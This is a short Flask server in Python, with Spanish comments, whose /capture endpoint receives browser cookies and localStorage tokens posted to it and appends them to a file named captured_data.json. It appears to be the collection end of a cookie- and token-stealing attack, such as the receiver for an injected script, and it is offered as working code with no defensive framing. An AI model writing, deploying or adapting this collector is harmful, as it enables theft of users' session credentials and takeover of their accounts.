from flask import Flask, request, jsonify, render_template
import json

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    cookies = data.get('cookies')
    local_storage_tokens = data.get('localStorageTokens')

    # Guardar los datos en un archivo JSON
    with open('captured_data.json', 'a') as f:
        json.dump({
            'cookies': cookies,
            'localStorageTokens': local_storage_tokens
        }, f)
        f.write('\n')

    return jsonify({"message": "Datos recibidos con éxito"})

if __name__ == '__main__':
    app.run(debug=True)
